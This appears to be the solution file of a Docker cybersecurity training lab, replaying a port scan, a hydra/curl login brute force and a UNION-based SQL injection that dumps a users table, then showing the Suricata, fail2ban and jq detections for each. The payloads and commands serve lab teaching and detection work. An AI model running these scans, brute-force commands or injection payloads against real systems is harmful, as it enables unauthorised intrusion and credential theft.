# Day 11 Lab — Solution & Expected Evidence

**Scope note on this file:** unlike Day 2/Day 4's `SOLUTION.md` (captured from a real
live run), this lab was built and verified with **static compose validation only**
(`docker compose config -q`) per this task's brief — the detectors below are designed
and documented from a careful walkthrough of exactly how each piece runs, not from a
pasted live capture. Commands, file paths, and log line shapes are exact and copy-
pasteable; timestamps, IPs, and Suricata's own build-specific log formatting will vary
run-to-run. The "If something doesn't match" section below names the one dependency
(AF_PACKET support inside the container) that's most likely to need the documented
fallback on a given host.

## 1. Attack Lab — replay commands

All three run from `labs/base` (where `attacker` is defined), against `labs/day11`'s
`target` over `cyberlab`.

### Replay 1 — port scan (Day 2's technique)

```sh
docker compose exec attacker sh -c "nmap -sS -p 5000 target"
```

**Expected:** `5000/tcp open` reported almost immediately — a single SYN-scan pass.
Run it 5+ times in under 10 seconds to actually cross the Suricata rule's threshold
(a single scan pass sends far fewer than 5 SYNs to the SAME port in most nmap
configurations unless retried):

```sh
docker compose exec attacker sh -c "for i in 1 2 3 4 5 6; do nmap -sS -p 5000 target > /dev/null; done"
```

### Replay 2 — brute force (Day 4's technique)

```sh
docker compose exec attacker sh -c "for i in 1 2 3 4 5 6; do curl -s -X POST target:5000/login -d 'username=admin&password=wrong'; echo; done"
```

**Expected:** six `{"status": "invalid credentials"}` responses, and six
`login_attempt` JSON lines with `"outcome": "fail"` appended to `target`'s access log
(readable from `labs/day11`: `docker compose exec target cat /var/log/webapp/access.log`).
Six failures within one `findtime` window (60s) crosses the `target-bruteforce`
jail's `maxretry = 5` threshold on the 6th.

A real hydra run works identically (and is closer to Day 4's actual attack):

```sh
docker compose exec attacker sh -c "hydra -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=invalid'"
```

(Reuses Day 4's `passwords.txt` if it's already staged in `/loot/day04`; any wordlist
containing several wrong guesses works just as well for tripping the jail.)

### Replay 3 — web injection (Day 8's technique, self-contained stand-in)

```sh
docker compose exec attacker sh -c "curl -s 'target:5000/search?q=firewall'"
```

**Expected (baseline, non-malicious):** `{"results": [[1, "firewall appliance", "199.99"]]}`
— proves the endpoint works normally before attacking it.

```sh
docker compose exec attacker sh -c "curl -s 'target:5000/search?q=nomatch%27%20UNION%20SELECT%20id%2C%20username%2C%20password%20FROM%20users--'"
```

(URL-decoded, this sends `q = nomatch' UNION SELECT id, username, password FROM
users--`.) **Expected:**

```json
{"results": [[1, "admin", "S3cr3t-Admin-PW!"], [2, "svc_backup", "b4ckup-service-2024"]]}
```

The `users` table's contents, exfiltrated through the `products` search box — classic
UNION-based SQLi. Column count matched (`id, name, price` ↔ `id, username, password`,
3 and 3), and the trailing `--` comments out the template's leftover `%'`.

## 2. Detection Lab — expected evidence per attack

### Detector 1 — Suricata (the scan)

```sh
cd cyber_security/labs/day11
docker compose exec detection sh -c "cat /var/log/suricata/fast.log"
```

**Expected**, after Replay 1's 6-scan burst:

```
xx/xx/xxxx-hh:mm:ss.ssssss  [**] [1:1000001:1] Possible port scan against target:5000 (SYN burst) [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} <attacker-ip>:<port> -> <target-ip>:5000
```

The rule's `sid:1000001` and message text are exact matches to
[`rules/suricata/local.rules`](rules/suricata/local.rules); the exact byte format of
the rest of the line is Suricata's own, version-dependent, fast.log formatting.

### Detector 2 — fail2ban (the brute force)

```sh
cd cyber_security/labs/day11
docker compose exec detection sh -c "cat /var/log/fail2ban.log | grep -i ban"
```

**Expected**, after Replay 2's 6 failures:

```
... fail2ban.filter [target-bruteforce] Found <attacker-ip> - ...
... fail2ban.filter [target-bruteforce] Found <attacker-ip> - ...
... fail2ban.filter [target-bruteforce] Found <attacker-ip> - ...
... fail2ban.filter [target-bruteforce] Found <attacker-ip> - ...
... fail2ban.filter [target-bruteforce] Found <attacker-ip> - ...
... fail2ban.actions [target-bruteforce] Ban <attacker-ip>
```

Five `Found` lines (one per failed attempt matched by the filter) followed by one
`Ban` line once `maxretry = 5` is crossed — confirming the ban's iptables side:

```sh
docker compose exec detection sh -c "iptables -L -n | grep <attacker-ip>"
```

**Expected:** a `DROP` rule referencing the attacker's IP, inserted by the
`iptables-allports` action into `target`'s own network namespace (see the compose
file's `network_mode: service:target` comment for why that's the same namespace).

### Detector 3 — jq log watcher (the injection)

```sh
cd cyber_security/labs/day11
docker compose exec target sh -c "cat /var/log/webapp/access.log" | jq -c 'select(.event=="search_query")'
```

**Expected**, the two `search_query` lines from Replay 3:

```json
{"ts":"...","event":"search_query","src_ip":"<attacker-ip>","query":"firewall","status":200}
{"ts":"...","event":"search_query","src_ip":"<attacker-ip>","query":"nomatch' UNION SELECT id, username, password FROM users--","status":200}
```

`sqli_watch.sh`'s own jq filter matches only the second line (the `UNION SELECT` /
`--` shapes) and appends to `/var/log/detect.log`:

```
2026-xx-xxTxx:xx:xxZ ALERT [injection] SQLi-shaped query on /search: nomatch' UNION SELECT id, username, password FROM users--
```

### Consolidated evidence — one file, all three

```sh
cd cyber_security/labs/day11
docker compose exec detection sh -c "cat /var/log/detect.log"
```

**Expected**, after replaying all three attacks:

```
ALERT [scan] xx/xx/xxxx-... [**] [1:1000001:1] Possible port scan against target:5000 (SYN burst) [**] ...
ALERT [bruteforce] ... fail2ban.actions [target-bruteforce] Ban <attacker-ip>
2026-xx-xxTxx:xx:xxZ ALERT [injection] SQLi-shaped query on /search: nomatch' UNION SELECT id, username, password FROM users--
```

Confirmed via the lab's own verify pattern:

```sh
docker compose exec detection sh -c "grep -Eiq 'ban|alert|fail' /var/log/detect.log && echo DETECT_OK"
```

**Expected:** `DETECT_OK`.

## If something doesn't match

- **Suricata never writes `fast.log` / exits immediately:** check
  `docker compose logs detection` for an AF_PACKET capture error. Some sandboxed/
  restricted Docker hosts don't expose AF_PACKET sockets to containers even with
  `NET_RAW`. Fallback: edit `detection/entrypoint.sh`'s suricata invocation to add
  `--pcap=eth0` in place of (or alongside) `-i eth0`, which forces libpcap capture
  mode instead of AF_PACKET, then `docker compose up -d --build`.
- **fail2ban reports `Unable to find log file` or never bans:** confirm `target` has
  actually received at least one `/login` POST first (`fail2ban` needs the log file to
  exist and have content before its `polling` backend starts finding matches) — the
  `touch` in `target/Dockerfile` and `detection/entrypoint.sh` both guard against a
  missing file, but an empty file with zero matching lines yet is expected right after
  startup, not a bug.
- **`docker compose exec attacker ...` fails with `service "attacker" is not
  running`:** you're running it from `labs/day11`. Run it from `labs/base` instead
  (same gotcha as every earlier day).
- **`docker compose exec detection ...` or `target ...` fails the same way in
  reverse:** those two services are defined in `labs/day11`, not `labs/base` — run
  from `labs/day11`.
- **IP addresses differ from this file:** expected — container IPs are assigned by
  Docker per-run. Only the log line shapes, rule/jail names, and detection logic
  matter for comparison.

## Answers reused from the content file

The attack/defense concept mapping and all five drills for Day 11 live in
[`content/day11-detection.md`](../../content/day11-detection.md) (Section 1's
telemetry/detection-engineering framing and Section 4) — worked answers are inline
there.
